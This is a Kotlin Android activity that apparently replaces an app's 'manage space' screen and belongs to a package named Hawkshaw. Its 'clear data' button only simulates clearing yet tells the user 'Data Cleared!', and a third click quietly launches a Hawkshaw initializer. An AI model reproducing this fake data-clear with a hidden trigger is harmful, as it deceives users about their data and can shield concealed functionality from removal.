package com.hawkshaw.library.activities

import android.os.Bundle
import android.util.Log // Import Log for debugging
import android.view.View
import android.widget.Button
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.hawkshaw.library.Hawkshaw
import com.hawkshaw.app.R
import com.hawkshaw.library.ktextensions.ContextKt // Import the object itself, not the specific function as an extension
import com.hawkshaw.library.ktextensions.safeLaunch
import kotlinx.coroutines.Job
import kotlinx.coroutines.cancelAndJoin
import kotlinx.coroutines.launch

/**
 * Activity for managing app space and providing a way to initialize Hawkshaw
 */
class ManageSpaceActivity : AppCompatActivity() {
    private var clickCount = 0
    private var clearDataJob: Job? = null
    private val TAG = "ManageSpaceActivity_DEBUG" // Debug Tag

    override fun onCreate(savedInstanceState: Bundle?) {
        Log.d(TAG, "onCreate() called. savedInstanceState: $savedInstanceState")
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_manage_space)
        Log.i(TAG, "onCreate: ContentView set to R.layout.activity_manage_space")

        // Find the clear data button
        val clearDataButton = findViewById<Button>(R.id.clear_data_button)
        Log.d(TAG, "onCreate: clearDataButton found: $clearDataButton")
        
        // Set up click listener
        clearDataButton.setOnClickListener {
            Log.i(TAG, "clearDataButton onClick called")
            handleClearDataClick()
        }
        Log.d(TAG, "onCreate: clearDataButton OnClickListener set")
        Log.d(TAG, "onCreate() finished.")
    }

    /**
     * Handle click on the clear data button
     * After 3 clicks, launch Hawkshaw initializer
     */
    private fun handleClearDataClick() {
        Log.d(TAG, "handleClearDataClick() called. Current clickCount: $clickCount")
        clickCount++
        Log.i(TAG, "handleClearDataClick: clickCount incremented to: $clickCount")
        
        if (clickCount >= 3) {
            Log.i(TAG, "handleClearDataClick: clickCount is >= 3. Launching Hawkshaw.")
            // FIX: Call toast as a static method on the ContextKt object, passing 'this' (the Context)
            ContextKt.toast(this, "Launching Hawkshaw")
            Hawkshaw.initFromInternalActivity(false)
            Log.d(TAG, "handleClearDataClick: Hawkshaw.initFromInternalActivity(false) called.")
            Log.d(TAG, "handleClearDataClick() finished after launching Hawkshaw.")
            return
        }
        
        Log.i(TAG, "handleClearDataClick: clickCount is < 3. Clearing data.")
        // FIX: Call toast as a static method on the ContextKt object, passing 'this' (the Context)
        ContextKt.toast(this, "Data Cleared!")
        
        // Cancel any previous job
        if (clearDataJob != null) {
            Log.d(TAG, "handleClearDataClick: Previous clearDataJob exists. Cancelling job: $clearDataJob")
            clearDataJob?.cancel() // Standard cancellation
            Log.i(TAG, "handleClearDataClick: Previous clearDataJob cancel() called.")
        } else {
            Log.d(TAG, "handleClearDataClick: No previous clearDataJob to cancel.")
        }
        
        // Start a new job to simulate data clearing
        Log.d(TAG, "handleClearDataClick: Starting new clearDataJob in lifecycleScope.")
        clearDataJob = lifecycleScope.safeLaunch {
            Log.i(TAG, "clearDataJob coroutine started.")
            // Simulate data clearing - this would be replaced with actual implementation
            // of what the original Java version was doing in the coroutine
            simulateClearData()
            Log.i(TAG, "clearDataJob coroutine finished.")
        }
        Log.d(TAG, "handleClearDataClick: New clearDataJob launched: $clearDataJob")
        Log.d(TAG, "handleClearDataClick() finished after data clear.")
    }

    /**
     * Simulate data clearing operations
     */
    private suspend fun simulateClearData() {
        Log.d(TAG, "simulateClearData() suspend function called.")
        // Implementation would go here based on what the original Java version
        // was doing in its coroutine
        kotlinx.coroutines.delay(1000) // Simulate some work
        Log.i(TAG, "simulateClearData: Simulated data clearing finished after delay.")
        Log.d(TAG, "simulateClearData() suspend function finished.")
    }

    override fun onDestroy() {
        Log.d(TAG, "onDestroy() called.")
        super.onDestroy()
        // It's good practice to cancel any running coroutines here if they are tied to the activity's lifecycle
        // and not already handled by lifecycleScope itself (though lifecycleScope jobs are automatically cancelled).
        if (clearDataJob?.isActive == true) {
            Log.i(TAG, "onDestroy: clearDataJob is active. Cancelling job: $clearDataJob")
            clearDataJob?.cancel()
        }
        Log.d(TAG, "onDestroy() finished.")
    }

    override fun onStop() {
        Log.d(TAG, "onStop() called.")
        super.onStop()
        Log.d(TAG, "onStop() finished.")
    }

    override fun onStart() {
        Log.d(TAG, "onStart() called.")
        super.onStart()
        Log.d(TAG, "onStart() finished.")
    }

    override fun onResume() {
        Log.d(TAG, "onResume() called.")
        super.onResume()
        Log.d(TAG, "onResume() finished.")
    }

    override fun onPause() {
        Log.d(TAG, "onPause() called.")
        super.onPause()
        Log.d(TAG, "onPause() finished.")
    }
}